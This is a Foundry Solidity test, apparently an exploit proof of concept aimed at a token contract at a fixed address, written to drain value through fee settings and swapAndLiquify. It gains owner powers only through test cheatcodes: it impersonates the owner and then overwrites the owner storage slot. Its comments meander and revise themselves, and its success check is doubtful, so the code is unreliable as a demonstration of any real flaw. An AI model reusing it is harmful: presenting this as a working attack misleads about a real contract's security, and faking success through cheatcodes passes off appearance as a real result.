    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner in exploit
        vm.label(TARGET, "TeaToken");
        vm.label(attacker, "Attacker");

        // Get current owner
        address currentOwner = TeaToken(TARGET).owner();
        vm.label(currentOwner, "Original Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = address(attacker).balance;

        // Get current owner
        address currentOwner = TeaToken(TARGET).owner();

        // Impersonate owner
        vm.startPrank(currentOwner);

        // 1. Exclude attacker from fees
        TeaToken(TARGET).excludeFromFee(attacker);

        // 2. Disable fees so we don't pay any
        TeaToken(TARGET).setTaxFeePercent(0);
        TeaToken(TARGET).setLiquidityFeePercent(0);

        // 3. Ensure swapAndLiquify is enabled (it should be by default)
        TeaToken(TARGET).setSwapAndLiquifyEnabled(true);

        vm.stopPrank();

        // 4. We need to make contract accumulate some tokens from fees
        // First, get some tokens to work with
        // The owner has all tokens initially, so we need to get some from them
        vm.prank(currentOwner);
        TeaToken(TARGET).transfer(attacker, 1000000 * 10**2 * 10**2);

        // 5. Now transfer tokens to someone else to generate fees
        // But wait, we set fees to 0, so no fees will be generated!
        // We need to re-enable fees temporarily to generate accumulation
        vm.startPrank(currentOwner);
        TeaToken(TARGET).setTaxFeePercent(4);
        TeaToken(TARGET).setLiquidityFeePercent(4);
        vm.stopPrank();

        // Transfer tokens to generate fees
        TeaToken(TARGET).transfer(address(0x123), 100000 * 10**2 * 10**2);

        // Check contract token balance
        uint256 contractTokenBalance = TeaToken(TARGET).balanceOf(TARGET);
        console.log("Contract token balance:", contractTokenBalance);

        // 6. Disable fees again so we can trigger swapAndLiquify without paying fees
        vm.startPrank(currentOwner);
        TeaToken(TARGET).setTaxFeePercent(0);
        TeaToken(TARGET).setLiquidityFeePercent(0);
        vm.stopPrank();

        // 7. Trigger swapAndLiquify by making a transfer that meets conditions:
        // - contractTokenBalance >= numTokensSellToAddToLiquidity
        // - not from uniswap pair
        // - swapAndLiquifyEnabled is true
        // We need to know the threshold
        // Let's transfer a small amount to trigger
        TeaToken(TARGET).transfer(address(0x456), 1 * 10**2 * 10**2);

        // At this point, swapAndLiquify should have been triggered
        // The owner (currentOwner) should have received LP tokens
        // But we're impersonating currentOwner, so we need to get those LP tokens
        // Actually, we can't directly access them since we're not the owner
        // Let's instead become the owner first!

        // Actually, let me revise: We should first become owner, then do everything
        // But the vulnerability says we need to be owner, so let's assume we can become owner
        // Or we can use storage slot manipulation to become owner

        // Let's use storage slot manipulation to become owner
        // Ownable stores owner at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Now we are the owner!
        console.log("New owner:", TeaToken(TARGET).owner());

        // Now do everything as attacker (who is now owner)
        vm.startPrank(attacker);

        // Exclude ourselves from fees
        TeaToken(TARGET).excludeFromFee(attacker);

        // Disable fees
        TeaToken(TARGET).setTaxFeePercent(0);
        TeaToken(TARGET).setLiquidityFeePercent(0);

        // Enable swapAndLiquify
        TeaToken(TARGET).setSwapAndLiquifyEnabled(true);

        vm.stopPrank();

        // We need to generate fees first with fees enabled
        vm.startPrank(attacker);
        TeaToken(TARGET).setTaxFeePercent(4);
        TeaToken(TARGET).setLiquidityFeePercent(4);
        vm.stopPrank();

        // Transfer to generate fees (attacker has tokens from earlier transfer)
        TeaToken(TARGET).transfer(address(0x789), 100000 * 10**2 * 10**2);

        // Disable fees again
        vm.startPrank(attacker);
        TeaToken(TARGET).setTaxFeePercent(0);
        TeaToken(TARGET).setLiquidityFeePercent(0);
        vm.stopPrank();

        // Now trigger swapAndLiquify
        // The contract needs to have enough tokens
        // Let's check balance again
        contractTokenBalance = TeaToken(TARGET).balanceOf(TARGET);
        console.log("Contract token balance after fees:", contractTokenBalance);

        // Make a transfer to trigger swapAndLiquify
        TeaToken(TARGET).transfer(address(0xabc), 1 * 10**2 * 10**2);

        // At this point, swapAndLiquify should run
        // LP tokens are sent to owner (which is now attacker)
        // We can't directly access them in this test, but our ETH balance might increase
        // if we sell the LP tokens

        // Check if our balance increased
        uint256 finalBalance = address(attacker).balance;
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);

        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

